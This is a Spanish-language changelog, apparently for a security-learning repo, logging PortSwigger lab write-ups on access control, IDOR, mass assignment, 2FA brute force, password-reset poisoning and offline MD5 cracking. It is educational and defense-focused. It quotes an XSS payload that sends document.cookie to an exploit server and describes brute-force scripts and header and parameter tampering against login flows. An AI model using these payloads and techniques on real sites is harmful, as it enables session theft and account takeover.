- **`learning/portswigger/user-id-controlled-by-request-parameter-with-unpredictable-user-ids/writeup.md`**: 6 secciones, tabla comparativa con el lab predecesor (mismo bug, distinto recon), patrones de leak de UUIDs en apps reales, distinción v1 vs v4.

### Conexión inventario

- **Sin nuevos archivos en inventario**: el lab refuerza `explotacion-idor.md` y `analisis-idor.md`. Inventario sigue en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-idor.md`: + writeup en `learning_refs:`.
- `inventario/04-explotacion/web/explotacion-idor.md`: + writeup en `learning_refs:`, + 4 aliases nuevos (`GUID leak`, `UUID leak`, `unpredictable IDs no son authz`, `random IDs no son control acceso`).

### Lección de proceso

Lab resuelto WITH user respetando el workflow: recon previo (buscar leaks del GUID en superficies públicas) → user encontró `/blogs?userId=<GUID>` → tampering directo → API key. Writeup escrito DESPUÉS de confirmar lab solved.

---

## [2026-05-08] — Writeup PortSwigger User ID controlled by request parameter + nuevo `explotacion-idor.md`

Quinto lab del cluster Access Control. Apprentice. Primer lab **horizontal** del cluster: no escalamos a admin, accedemos lateralmente a otro user del mismo nivel. IDOR canónico: URL `/my-account?id=wiener` carga datos de wiener; cambiar a `?id=carlos` carga datos de carlos (incluyendo API key) sin chequeo de ownership. 1 request, lab solved.

### Hallazgos no triviales documentados en el writeup

1. **Identificar y autorizar son cosas distintas**: identificar el recurso a cargar puede venir del cliente; autorizar al cliente a leerlo siempre del server. Cuando ambas se contestan con el mismo dato del cliente, hay IDOR.
2. **El parámetro `?id=` en endpoint self-service no debería existir**: la URL `/my-account?id=wiener` es semánticamente redundante (la sesión ya identifica al user). El smell sugiere que el dev compartió endpoint para "self" y "other" tomando atajo. Fix más simple: derivar de sesión, sin params.
3. **IDOR es la sub-categoría más prevalente de Broken Access Control**: aparece en cualquier endpoint donde el ID del recurso se mande explícito (orders, invoices, messages, photos, tickets). Tests automatizados deben cubrir todos los endpoints de recurso.
4. **Patrones correctos**: 3 patterns válidos según semántica del endpoint. Self-only access (target = session.user_id, sin `?id=`). Admin access (endpoint separado con permission check). Sharing entre users (ownership check + opt-in del owner).

### Archivos nuevos

- **`learning/portswigger/user-id-controlled-by-request-parameter/writeup.md`**: 6 secciones con código del antipatrón vs 3 implementaciones correctas (self-only, admin, sharing), tabla comparativa con los 4 labs anteriores del cluster (primer horizontal vs verticales).
- **`inventario/04-explotacion/web/explotacion-idor.md`**: archivo nuevo del inventario, par cross-fase de `analisis-idor.md` (Phase 03). Cubre categorías de IDs explotables (numéricos, usernames, UUIDs predecibles, hashes débiles), categorías de objetos afectados, herramientas (Burp Authorize, ffuf, autorize), workflows de tampering y enumeración. MITRE T1190.

### Conexión inventario

- Inventario crece a **134 archivos** (era 133). Nuevo archivo `explotacion-idor.md` linkea con `analisis-idor.md` vía `related:`.
- `analisis-idor.md` (Phase 03): + `explotacion-idor` en `related:`, + writeup en `learning_refs:`.

### Verificación

- `bash scripts/check.sh` ✓ (134/134 OK, indexes idempotentes).
- Lab marcado solved.

---

## [2026-05-08] — Writeup PortSwigger User role can be modified in user profile

Cuarto lab del cluster Access Control. Apprentice. Mass assignment clásico: el endpoint `POST /my-account/change-email` deserializa el JSON del body sin allowlist y aplica todos los campos al modelo del user. Agregando `"roleid": 2` al body, escalamos la propia cuenta a admin. La response del legítimo update email leakea el nombre del campo (`{"username":...,"roleid":1}`), lo que vuelve trivial el discovery del vector.

### Hallazgos no triviales documentados en el writeup

1. **Mass assignment es default sin allowlist**: cualquier framework que setea atributos directos del request body es vulnerable hasta que el dev ponga el filtro explícito (Rails `permit`, Django REST `Meta.fields`, Spring `@JsonView`/DTOs). Default opt-out es la fix.
2. **Responses verbosas son discovery gratis para el atacante**: el server devuelve el modelo completo del user en cada update, regalando los nombres de los campos manipulables. Anti-patrón doble: aceptar más de lo debido + devolver más de lo debido. Response minima por endpoint.
3. **Authz check en `/admin` no alcanza**: el dato que `/admin` consulta (`roleid`) puede ser modificable desde otro endpoint. Defensa en profundidad requiere que cada endpoint que modifica datos sensibles tenga su propio authz check y que datos de role sean modificables solo desde endpoints admin específicos.
4. **Patrón aparece en múltiples dominios**: signup endpoints (`is_admin=true`), profile update, account settings, subscription/billing (`tier=premium`), order creation (`discount=100`). Regla: el server siempre define qué campos puede modificar el cliente, allowlist por endpoint.
5. **Comparación con labs hermanos**: 4 mecánicas distintas en 4 labs: ausencia de auth (paths leak), authz en input cliente (cookie tampering), authz correcto pero bypass por endpoint adyacente (este lab), [próximos en el cluster]. La defensa unificada no es una sola cosa: requiere auth en cada endpoint + authz consistente + allowlist en input + responses minimal.

### Archivos nuevos

- **`learning/portswigger/user-role-can-be-modified-in-user-profile/writeup.md`**: 7 secciones con código del antipatrón vs allowlist explícita, mapeo de framework-specific solutions (Rails strong_parameters, Django ModelSerializer, Spring DTOs), tabla comparativa con los 3 labs anteriores del cluster.

### Conexión inventario

- `explotacion-broken-access-control.md`: + writeup en `learning_refs:` (4 writeups). + 6 aliases nuevos: `mass assignment, sobre-aceptacion de campos, BOPLA, broken object property level authorization, autobinding vulnerability, strong parameters bypass`.

### Verificación

- `bash scripts/check.sh` ✓ (133/133 OK, indexes idempotentes).
- Lab marcado solved.

---

## [2026-05-08] — Writeup PortSwigger User role controlled by request parameter

Tercer lab del cluster Access Control. Apprentice. Vector clásico: el server arma autorización a partir de una cookie `Admin=true|false` plaintext, controlable por el cliente. Tampering directo (`Admin=false` → `Admin=true`) escala a admin. Resuelto con 1 curl.

### Hallazgos no triviales documentados en el writeup

1. **Cookies plaintext semánticas son input del cliente**: cookies persisten en el browser, el cliente las controla. `Admin=false` plaintext sin firma = campo de formulario disfrazado de estado server-side. Antipatrón canónico.
2. **Tres categorías de cookies**: opaque/random (`session=ABC...`, key hacia state real), firmadas/cifradas (JWT, signed cookies; cliente puede leer pero modificar invalida firma), plaintext semántico (`Admin=false`; nunca para autorización).
3. **Authz siempre desde sesión opaque + lookup server-side**: la sesión es token random; el role se consulta en DB indexado por user_id. El cliente nunca controla el role.
4. **Patrón general aparece en múltiples capas**: cookies, hidden inputs, JWTs sin verify firma, headers custom (`X-User-Role: admin`), query/body params, localStorage flags. Defensa uniforme: no confiar en input del cliente para decisiones de seguridad.

### Archivos nuevos

- **`learning/portswigger/user-role-controlled-by-request-parameter/writeup.md`**: 7 secciones con tabla de las 3 categorías de cookies, código del antipatrón vs decorator `@require_role`, comparación con los 2 labs hermanos.

### Conexión inventario

- `explotacion-broken-access-control.md`: + writeup en `learning_refs:` (3 writeups ahora).

### Verificación

- `bash scripts/check.sh` ✓ (133/133 OK, indexes idempotentes).
- Lab marcado solved.

---

## [2026-05-08] — Writeup PortSwigger Unprotected admin functionality with unpredictable URL

Segundo lab del cluster Access Control. Apprentice. Variante del anterior: el path admin es random por instancia (`/admin-gvzkbk`), pero JavaScript del frontend lo lleva hardcoded como string literal junto a un `var isAdmin = false` que solo controla si renderear el link en el DOM. El path leakea a todos los visitantes incluyendo anónimos.

### Hallazgos no triviales documentados en el writeup

1. **Frontend nunca enforce**: cualquier defensa que dependa del comportamiento del cliente es teatro. Hidden inputs, JS que oculta features, disabled buttons, validación client-side, role flags en HTML son todos bypasseables porque el cliente está bajo control del atacante.
2. **Random URLs no son auth**: agregan entropía al path pero el path leakea por múltiples vectores (JS, JSON responses, error messages, browser history). El path puede ser predecible si el endpoint exige role server-side.
3. **El antipatrón del role-check client-side**: el dev pensó "el botón solo se muestra si sos admin, así que solo admins lo ven". La pregunta correcta es "¿qué pasa si alguien construye la request directamente?". Si el server le permite la acción, el botón es decorativo.
4. **Diferencia con lab anterior**: ambos labs prueban la misma lección (obscuridad es defensa decorativa, auth es defensa real). Cambia el vector de leak: robots.txt en el primero, JS del frontend en este.

### Archivos nuevos

- **`learning/portswigger/unprotected-admin-functionality-with-unpredictable-url/writeup.md`**: 7 secciones con el JS leakeado real, tabla comparativa con el lab hermano, código del antipatrón vs implementación correcta del decorator.

### Conexión inventario

- `explotacion-broken-access-control.md`: + `portswigger/unprotected-admin-functionality-with-unpredictable-url` en `learning_refs:` (2 writeups ahora).

### Verificación

- `bash scripts/check.sh` ✓ (133/133 OK, indexes idempotentes).
- Lab marcado solved.

---

## [2026-05-08] — Writeup PortSwigger Unprotected admin functionality + nuevo `explotacion-broken-access-control.md`

Primer lab del cluster Access Control. Apprentice. Vector trivial: `robots.txt` revela `/administrator-panel`, panel sin auth permite borrar a carlos con un GET. Resuelto con 3 curl commands en <30 segundos. El valor del lab está en la lección de diseño, no en la dificultad técnica.

### Hallazgos no triviales documentados en el writeup

1. **`robots.txt` es lista de objetivos para el atacante**: archivos cuyo único propósito es decir a crawlers "no indexes esto" anuncian explícitamente las rutas sensibles. La fix correcta es auth en el endpoint, no esconder el path.
2. **Security through obscurity como anti-pattern**: si el único impedimento al acceso es no conocer la URL, eventualmente alguien la conoce. Vectores de descubrimiento múltiples: robots.txt, sitemap, JS leaks, wordlists (dirb/gobuster), Google dorking, errores con stack traces.
3. **GET para mutaciones es CSRF-vulnerable**: incluso si el panel tuviera auth, un delete via `GET /delete?user=X` permite que `<img src=...>` en cualquier sitio ejecute la acción cuando un admin lo carga. POST/DELETE + CSRF token es la forma correcta.
4. **Deny by default en lugar de allow by default**: cada endpoint debe declarar explícitamente sus requisitos. Decorators/middleware consistentes evitan olvidos por endpoint.

### Archivos nuevos

- **`learning/portswigger/unprotected-admin-functionality/writeup.md`**: 7 secciones con código del antipatrón vs implementación correcta del decorator `@require_admin`, sub-patterns de OWASP A01, diagrama Mermaid.
- **`inventario/04-explotacion/web/explotacion-broken-access-control.md`**: archivo nuevo del inventario que cubre el umbrella de Broken Access Control (OWASP A01:2021). Categorías: functional level missing, IDOR, method-based bypass, URL-based bypass, multi-step bypass, referer-based, vertical/horizontal privesc. MITRE T1190. Hogar para futuros labs del cluster Access Control.

### Conexión inventario

- Inventario crece a **133 archivos** (era 132). `04-explotacion/web/INDEX.md` regenerado con la nueva entrada. `TOPICS.md` y los 4 facetados regenerados.

### Verificación

- `bash scripts/check.sh` ✓ (133/133 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado.

---

## [2026-05-08] — Writeup PortSwigger 2FA bypass using a brute-force attack + script `bruteforce.py`

Lab Practitioner que cierra el cluster MFA bypass de PortSwigger (3 writeups: simple bypass, broken logic, este). Vector: brute-force directo del OTP de 4 dígitos. El defender implementó dos "defensas decorativas" — CSRF token que rota en cada response y session kick al segundo intento de OTP — pero ninguna mitiga brute-force. Costo del atacante: 4 requests por candidato (GET /login → POST /login → GET /login2 → POST /login2). Con 40 workers paralelos en sesiones independientes, el ataque completo termina en <5 minutos. Credenciales objetivo provistas por el lab (`carlos:montoya`); el OTP se encontró en `0255` con ~200 intentos.

### Hallazgos no triviales documentados en el writeup

1. **CSRF rotation no es rate-limit**: defienden contra threat models distintos. CSRF mitiga ataques cross-site (otra origin haciendo POST al endpoint vulnerable); rate-limit mitiga brute-force same-origin con script. Bypass del CSRF rotation = 1 línea de regex sobre la response anterior. Apilar CSRF sobre un endpoint sin rate-limit es defensa parcial.
2. **Session kick al N-ésimo intento es defensa decorativa**: parece reducir el espacio de ataque pero solo agrega un re-login al costo del atacante. En este lab, kick al 2do intento → 4 requests/candidato vs 1 request/candidato sin defensa. Multiplicador 4× sobre 10⁴ = trivial. Para defender se necesita lockout que escale **no-linealmente** con N intentos: por usuario (no sesión), absoluto, idealmente exponencial.
3. **El threat model "atacante interactivo" vs "atacante con script" requiere defensas distintas**: CSRF y session kick mitigan al primero (un user que tipea mal una vez); rate-limit/lockout mitigan al segundo. Un sistema con solo las primeras protege UX legítima pero no atacantes reales.
4. **Patrón general - defensas decorativas**: aparece en CAPTCHA solo en login (no en password reset), rate-limit por IP bypassable con rotation, password complexity sin breached-password check, MFA por SMS sin defensa contra SIM swap, HTTPS sin HSTS. La regla universal: cada defensa atiende un threat model específico, apilar una capa no protege otros vectores.
5. **Comparación cuantitativa con 2fa-broken-logic**: mismo espacio (10⁴), mismo objetivo (acceder a /my-account?id=carlos), distinto wrapper. Broken logic: 1 req/candidato (con sesión persistente), <1 minuto. Este: 4 req/candidato (re-login completo), <5 minutos. La diferencia visible (4× cost) es insignificante; el espacio sigue siendo brute-forceable porque sigue siendo finito y barato.
6. **Implementación correcta del state machine**: rate-limit por user_id (no session_id), lockout temporal absoluto tras 5 intentos, OTP ligado a sesión específica (`(user_id, session_id)`), one-shot use, notificación al usuario. La fix del lab no es "tener csrf más fuerte" sino "agregar lockout".

### Iteración real durante la resolución

El user inicialmente confundió "me saca al segundo intento" con "kick al primero". Tuvimos que aclarar: tras submitir 1 OTP, la sesión sigue válida; al submitir el 2do, kick. Por eso 1 intento útil por sesión. El script se diseñó alrededor de eso: cada candidato es un cycle independiente con su propia sesión.

### Archivos nuevos
- **`learning/portswigger/2fa-bypass-using-a-brute-force-attack/writeup.md`**: 7 secciones con datos reales (cookies, status codes, csrf tokens), tabla comparativa con los 2 labs MFA hermanos, código del antipatrón vs implementación correcta del state machine + binding OTP a sesión, sección sobre threat models distintos y defensas decorativas, diagrama Mermaid.
- **`learning/portswigger/2fa-bypass-using-a-brute-force-attack/bruteforce.py`**: ~140 líneas, `ThreadPoolExecutor` con 4 requests/candidato (GET /login → POST /login → GET /login2 → POST /login2), regex CSRF para extraer tokens de cada response, sessions independientes por worker. Default 30 workers, configurable.

### Conexión inventario
- `explotacion-mfa-bypass.md`: + `portswigger/2fa-bypass-using-a-brute-force-attack` en `learning_refs:` (3 writeups ahora). + 5 aliases nuevos: `2FA brute force, OTP brute force, CSRF rotation bypass, decorative defenses, session kick bypass`.

### Verificación
- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado tras visit a `/my-account` con la session post-2FA.

---

## [2026-05-08] — Writeup PortSwigger Broken brute-force protection, multiple credentials per request

Lab Practitioner que cierra el cluster auth de PortSwigger sumando un séptimo writeup. Vector único en la familia: el endpoint de login es JSON-nativo (`Content-Type: application/json`), y `password` puede ser un array que el server itera completo. El rate-limit del defender cuenta requests, no candidatos. Resultado: empacando 100 passwords en una sola request, el ataque completo se ejecuta en **1 sola request HTTP** (~987 bytes de body, <1 segundo de tiempo). Credenciales encontradas: `carlos:555555` (binary search post-hoc en 7 requests adicionales para identificar el match exacto).

### Hallazgos no triviales documentados en el writeup

1. **Type confusion entre JSON y form-encoded**: el contrato implícito de "1 request = 1 credencial" se mantiene en form-encoded (clave-valor flat), pero JSON permite estructuras anidadas. Si el backend acepta `password` como array y lo procesa, una request lleva N credenciales. La defensa diseñada para form-encoded no se actualizó al contrato JSON. Es la clase de bug que aparece cuando se agrega una API nueva sin auditar las defensas perimetrales que asumían el contrato anterior.
2. **Rate-limit mide la métrica equivocada**: contar requests es proxy del esfuerzo del atacante, pero lo que importa es el esfuerzo de validación del backend. La fix correcta no es "no permitir arrays" sino "contar `len(array)` attempts" en el rate-limit. Patrón general: medir lo que cuesta mucho (operaciones lógicas), no lo que cuesta poco (HTTP requests).
3. **Validación de tipo estricta como primera línea de defensa**: rechazar `password` que no sea string en una sola línea de código cierra el vector independientemente del estado del rate-limit. Es la fix más limpia: local al endpoint, fail-safe (rechaza antes de tocar lógica de auth), self-documenting.
4. **El vector escala más allá de login**: el mismo antipattern aparece en search endpoints, email blast prevention, coupon redemption, GraphQL batch queries. Cualquier endpoint con defenses scalar-input que acepta JSON sin validar tipo es vulnerable. La regla universal: medir la métrica correcta y validar tipos estrictamente.
5. **Trampa operacional con "Follow redirects" + cookies**: el primer test del vector (peter al inicio del array) parecía fallar porque Burp Repeater seguía redirects perdiendo la cookie nueva entre saltos. La login real (302 a `/my-account`) sucedía en la **primera response** de la cadena, pero la última visible era el re-render del login. Lección: cuando se inspecciona redirect chains, mirar la primera response cruda. Confiar en la última induce falsos negativos.
6. **Binary search reusa el mismo vector como oráculo**: identificar exactamente cuál de los 100 passwords matcheó requiere log2(100) ≈ 7 requests adicionales, usando el mismo "array de passwords" pero como oráculo binario sobre subsets. Mismo mecanismo, dos preguntas distintas: oneshot pregunta "¿alguno match?", bsearch pregunta "¿en qué mitad?".
7. **Mejor relación brute-force/request del cluster auth**: 1 request para 100 candidatos vs 100-200 requests en los labs hermanos (IP block, change-password). Por orden de magnitud el ataque más eficiente del cluster.

### Iteración real durante la resolución

El usuario inicialmente concluyó "no hizo login" cuando la primera response de un test era 302 success pero el "Follow redirects" de Burp llevaba a la chain hasta /login. Faltaba la configuración de "Process Cookies..." de Burp para seguir la cadena correctamente. Lección incorporada al writeup como anti-tip operacional.

### Archivos nuevos
- **`learning/portswigger/broken-bruteforce-protection-multiple-credentials-per-request/writeup.md`**: 7 secciones con datos reales (cookies, status codes, request bytes), tabla comparativa de costos del cluster auth (este es 1 request vs ~200 en otros), código del antipatrón vs implementación correcta del state machine + binding de OTP a sesión, mapeo del patrón general de type confusion en API rate-limits, diagrama Mermaid.
- **`learning/portswigger/broken-bruteforce-protection-multiple-credentials-per-request/bruteforce.py`**: ~110 líneas, dos modos: `oneshot` (1 request con todos los candidatos) y `bsearch` (binary search log2(N) para identificar el password exacto post-hoc).
- **`learning/portswigger/broken-bruteforce-protection-multiple-credentials-per-request/passwords.txt`**: wordlist canónica de PortSwigger (100 passwords).

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/broken-bruteforce-protection-multiple-credentials-per-request` en `learning_refs:` (7 writeups ahora). + 6 aliases nuevos: `multiple credentials per request, password array bypass, JSON type confusion login, rate-limit metric bypass, agregacion de candidatos en un request, type confusion bruteforce`.

### Verificación
- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado tras visit a `/my-account` con la session de carlos.

---

## [2026-05-08] — Writeup PortSwigger Password brute-force via password change + script `bruteforce.py`

Lab Practitioner que cierra el cluster auth de PortSwigger sumando un sexto writeup. Cambia el target del ataque: no es el login form (donde están todas las defensas - rate-limit, lockout, captcha) sino el endpoint **post-login** `POST /my-account/change-password`. El defender concentró defensas en el login asumiendo que post-auth ya no era superficie crítica; el resultado es un endpoint que valida credenciales sin las defensas del login y termina siendo brute-force oracle universal. Combinación de tres defectos: `username` honrado del body (no de sesión), branches de error distinguibles según validez del current-password, y kick-on-failure que invalida sesión sin lockear cuenta. Credenciales encontradas: `carlos:summer` (~50 intentos del wordlist canónico).

### Hallazgos no triviales documentados en el writeup

1. **Asimetría defensiva entre login y change-password**: el threat model del defender asume que post-login el atacante "ya superó el login". Falso: la sesión es barata (login propia + `wiener:peter` regalada por el lab). Cualquier endpoint que valide credenciales necesita las mismas defensas que el login. La concentración de defensas en login crea una superficie estrictamente más débil en endpoints adyacentes.
2. **`username` en body como antipattern**: el endpoint acepta `username` controlable por el cliente y lo usa para el lookup del current-password. Mismo patrón que IDOR (`?account_id=42`), mass assignment, host header injection. La fix correcta: target user de `session['user_id']`, nunca del body. Si admin necesita cambiar passwords de otros, endpoint separado con permission check explícito.
3. **El truco del `new-password-1 != new-password-2` para forzar el oráculo**: enviando new mismatched, el server entra en una rama de validación donde primero chequea current-password antes de comparar los nuevos. El error message diferencia entre "Current password is incorrect" (kick a /login) y "New passwords do not match" (200 informativo). Sin esa asimetría intencional, el atacante no podría usar el endpoint como oráculo. Lección para defenders: **validar todos los inputs antes de cualquier check de credenciales**, así la rama "current incorrecto + new mismatch" deja de existir como path distinto.
4. **El kick-on-failure no es defensa, es señal**: invalidar la sesión cuando current-password falla **comunica** al atacante que falló. La defensa silenciosa (mantener sesión, registrar intento server-side, lockear tras N) es estrictamente mejor. Bonus: el kick añade re-login costo al brute-force (2 requests/candidato), pero sigue siendo trivial con paralelismo.
5. **Rama 4-quadrants para encontrar el oráculo**: probar las 4 combinaciones (user propio/víctima × current correcto/incorrecto) con new mismatched es la disciplina canónica para mapear oráculos. En este lab: `(wiener, correcto)` → 200 informativo; las otras tres → 302 kick. Esa única asimetría es el oráculo binario.
6. **Patrón general - auth oracles en endpoints autenticados**: aparece en email change, account verification, account deletion, 2FA disable, API token revocation. Cualquier endpoint que (a) acepte target controlable y (b) revele validez de credenciales en branches de error distintos es un oráculo. Defensa: respuestas uniformes byte-a-byte en todas las ramas de fallo.
7. **Detección por content vs status**: con `requests.Session()` siguiendo redirects por default, el 302 a /login se resuelve a 200 del login form. La detección por status falla. El discriminador robusto es **el contenido**: `b"New passwords do not match" in r.content`, que sólo aparece cuando current-password matchea. Lección: cuando el side-channel es semántico (mensaje), validar por contenido aunque el status también difiera.

### Iteración real durante la resolución

Mapping de los 4 cuadrantes con el usuario fue la fase clave: el primer test (username=carlos sin más) dio 302 que parecía cerrar el vector. Hizo falta probar new-password mismatched para revelar la asimetría real. El usuario lo hizo correctamente y el oráculo apareció claro en el quadrant `(wiener, peter, mismatched)` vs los otros tres. Sin la disciplina de los 4 cuadrantes, era fácil descartar el lab como "no vulnerable a este vector".

### Archivos nuevos
- **`learning/portswigger/password-brute-force-via-password-change/writeup.md`**: 7 secciones con tabla de los 4 cuadrantes del oráculo, código del antipatrón vs implementación correcta del state machine de change-password, comparación con los 5 labs auth previos del cluster, patrón general de oráculos post-login, diagrama Mermaid de la cadena completa.
- **`learning/portswigger/password-brute-force-via-password-change/bruteforce.py`**: ~140 líneas, `ThreadPoolExecutor` con re-login automático antes de cada candidato (porque server invalida sesión en cada fallo), discriminador por contenido `"New passwords do not match"`, soporta `--target` y `--attacker-*` para reusar contra otros labs/setups.
- **`learning/portswigger/password-brute-force-via-password-change/passwords.txt`**: wordlist canónica de PortSwigger (100 passwords), copiada de labs anteriores.

### Conexión inventario
- `explotacion-brute-force-advanced.md`: + `portswigger/password-brute-force-via-password-change` en `learning_refs:` (6 writeups ahora). + 5 aliases nuevos: `password brute-force via change-password, change-password as oracle, post-login auth oracle, asymmetric defense, defense asymmetry login vs change-password`.

### Verificación
- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado tras login con `carlos:summer` y visit a `/my-account`.

---

## [2026-05-08] — Writeup PortSwigger Password reset poisoning via middleware

Lab Practitioner que cierra el cluster de password reset (segundo writeup de la familia, junto a "broken logic"). Vector distinto: en lugar de atacar la lógica del token, ataca el canal de delivery del email. El backend confía en `X-Forwarded-Host` para construir la URL absoluta del link de reset, sin validar contra una allowlist. Inyectando ese header con el dominio del exploit server, el link en el email de carlos apunta a un dominio que controlamos; cuando el lab simula su click, el token se filtra al access log. Resolución end-to-end: ~5 minutos guiada por el usuario en Burp Repeater + Email client + Access log del exploit server. Lab marcado solved con `carlos:hacked123`.

### Hallazgos no triviales documentados en el writeup

1. **`X-Forwarded-Host` vs `Host:` directo**: cambiar `Host:` falla porque el reverse proxy enruta por ese header y rechaza la request si no matchea su vhost. `X-Forwarded-Host` es el bypass elegante: el proxy lo deja pasar (no afecta enrutamiento), el backend lo prefiere sobre `Host:` para construir URLs. Mantenés `Host:` legítimo para pasar el middleware e inyectás `X-Forwarded-Host:` para envenenar el backend. Esa es la mecánica del "via middleware" en el título del lab.
2. **Confused Deputy class**: el backend asume que `X-Forwarded-Host` viene del proxy (entidad confiable), cuando en realidad viene del cliente (no confiable). El proxy no strippea ni normaliza el header de input. Mismo patrón aparece en `X-Real-IP` para auth, `X-Forwarded-For` para rate-limiting, `Origin` cuando se usa como autorización CSRF.
3. **Validar el vector con tu cuenta antes de carlos**: si el header no funciona, ves el fallo con tu email. Atacar carlos directo sin confirmar quema un token que se le envió a su email real (no controlable) y consume un intento sin saber por qué. Disciplina general en pentesting: probar la mecánica con la cuenta propia antes de quemarla con la víctima.
4. **El exploit server como sink de capturas**: `Access log` del exploit server logea cualquier request que reciba, incluyendo URL completa con query string. Status 404 (porque el exploit server no tiene handler para `/forgot-password`) **no impide** la captura: la request se logea antes de procesarse. User-agent `(Victim)` confirma que el lab simuló el click de carlos.
5. **Hostname desde config, no del request**: la fix correcta es cargar `APP_HOSTNAME` de variable de entorno al boot y usarla para todas las URLs absolutas. Sin fallback a headers del request. Multi-tenant requiere allowlist explícita (`ALLOWED_HOSTS = {"app.example.com", ...}`) y rechazo de cualquier otro valor.
6. **Diferencia con "Password reset broken logic"**: ambos son ATO via reset, pero por capas distintas. Broken logic ataca la lógica de validación del token (re-uso, predicción, falta de binding). Via middleware ataca el canal de delivery del token (envenena el link). Las fix son distintas: el primero requiere lógica server-side correcta, el segundo requiere config estática del hostname.
7. **Patrón general - Host header injection**: el mismo defecto puede aparecer en verification emails, magic login links, cache poisoning, SSRF lateral, open redirect. La defensa unificada: nunca confiar en headers del cliente para identidad o construcción de URLs.

### Iteración real durante la resolución

El usuario inicialmente compartió la request del paso final del reset (POST con `new-password-1` y `new-password-2`) en lugar de la request inicial (POST con `username=wiener`). Tuvimos que pedirle que reprodujera el primer paso. Útil aprendizaje: cuando uno guía un lab paso a paso, ser específico sobre qué request del flujo se necesita capturar; los users pueden submitir el flujo completo end-to-end antes de que pidamos por separado.

### Archivos nuevos
- **`learning/portswigger/password-reset-poisoning-via-middleware/writeup.md`**: 7 secciones con datos reales de la corrida (cookies, tokens, headers, URLs antes y después del envenenamiento), código del antipatrón vs implementación correcta del hostname desde config, tabla comparativa con "broken logic", patrón general Host header injection, diagrama Mermaid de la cadena de 8 pasos.

### Conexión inventario
- `explotacion-password-reset-flaws.md`: + `portswigger/password-reset-poisoning-via-middleware` en `learning_refs:` (2 writeups ahora junto a `password-reset-broken-logic`).

### Verificación
- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
- Lab marcado solved: banner `is-solved` confirmado en `/my-account?id=carlos`.

---

## [2026-05-08] — Writeup PortSwigger Offline password cracking (cadena XSS + cookie + MD5)

Lab Practitioner que encadena tres vulnerabilidades distintas: stored XSS en comentarios, cookie `stay-logged-in` sin `HttpOnly` con formato `base64(user:md5(pwd))`, y password storage MD5 sin salt. Ataque: postear comentario con `<script>document.location='//exploit-server/'+document.cookie</script>`, esperar al bot víctima, leer cookie del access log del exploit server, decodificar, crackear MD5 (CrackStation lookup en este caso), login y delete account. Credenciales: `carlos:onceuponatime` (deterministic en este lab para que CrackStation lo indexe).

### Hallazgos no triviales documentados en el writeup

1. **Defensa en profundidad solo funciona si las capas son ortogonales**. Las cuatro defensas (XSS sanitization, HttpOnly, opaque tokens, bcrypt) atacan dimensiones distintas — no son redundantes en el mismo eje. Sustituir una por "tenemos otra fuerte" deja abierto el agujero correspondiente. La cadena del lab existe porque las cuatro fallaron simultáneamente; cerrar cualquiera (excepto la última) la rompe enteramente.
2. **El hash exfiltrado es información persistente; la sesión robada es información temporal**. Aún si una sesión expira, el password recuperado del hash es reusable hasta que el usuario lo cambie — semanas o nunca. Hace este lab más grave que un session-hijack puro: compromiso de identidad de larga duración.
3. **Footprint mínimo vs el lab anterior**: brute-forcing de cookie generaba 100+ requests sospechosos al lab; este genera 1 comentario benigno + 1 login válido. Defensor ve patrón de actividad normal. La sigilosidad del XSS-driven attack es un argumento adicional para que las apps protejan ese vector, más allá del impacto directo.
4. **Los listeners JS son parte del contrato del form, no decoración**. Mi automatización del POST `/my-account/delete` falló porque leí solo el HTML estático (button bare sin token visible) e ignoré que el lab espera un handler JS asociado a `#delete-account-form` que probablemente añade un campo o header al confirm. El click manual del usuario en browser sí disparó esa lógica. **Lección operacional**: para reproducir un click sensible, primero interceptar la request real en Burp Repeater y reproducir EXACTAMENTE ese payload, no inferir desde el HTML.
5. **PortSwigger usa passwords deterministicos en estos labs**: `onceuponatime` está hardcoded para que CrackStation/Google lo indexe. Eso permite al alumno ver el ataque sin depender del estado de wordlists locales o de tener GPU. En un escenario real con password obscuro: hashcat con rockyou+rules en GPU resuelve la mayoría; passwords realmente random fallarían y el atacante quedaría limitado a la sesión activa.
6. **Comparación con el lab anterior** (brute-forcing stay-logged-in cookie): mismo formato de cookie, vector totalmente distinto. Online vs offline. 100 requests vs 2. Wordlist requerida vs no. Tabla detallada en §4.3 del writeup.

### Archivos nuevos
- **`learning/portswigger/offline-password-cracking/writeup.md`**: 7 secciones con análisis de la cadena de 3 vulnerabilidades, tabla de qué pasa si se cierra cada vector, jerarquía de defensas (5 niveles ortogonales), mecánicas del bot simulado, lección operacional sobre el delete form. Diagrama Mermaid de 13 pasos.

### Conexión inventario
- `explotacion-session-cookies-debiles.md`: + `portswigger/offline-password-cracking` en `learning_refs:` (2 writeups ahora). + 3 aliases nuevos (`cookie exfiltration via XSS, offline password cracking from cookie, MD5 password hash leak`).
- `explotacion-xss.md`: + `portswigger/offline-password-cracking` en `learning_refs:` (cross-link al primer eslabón de la cadena).

### Verificación
- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
- Lab marcado solved (browser): banner "Solved" verificado por screenshot del usuario.

---

## [2026-05-07] — Writeup PortSwigger Brute-forcing stay-logged-in cookie + nuevo `explotacion-session-cookies-debiles.md`

Primer lab del cluster "Other authentication mechanisms" de PortSwigger. Cambia el target del ataque: ya no es el form de login sino la cookie persistente. Formato de la cookie: `base64(username + ":" + md5(password))`. Sin salt, MD5 rapido, y formato hash-as-token. 100 candidatos sequential = ~2 segundos. Credenciales: `carlos:12345` (pwd #6 del wordlist).

### Hallazgos no triviales documentados en el writeup

1. **Tres antipatterns acumulados, cualquiera basta para romperla**: (a) MD5 rapido (~10⁹ h/s GPU, rainbow tables disponibles), (b) sin salt (mismo pwd → mismo hash siempre, cross-application leakage), (c) hash-as-token (compromiso de la DB = compromiso de cookies sin necesidad de craquear hashes). Los tres juntos vuelven el ataque trivial; la regla simple: cualquier cookie cuya validez sea verificable client-side sin lookup en server-side store es brute-forceable o forgeable.
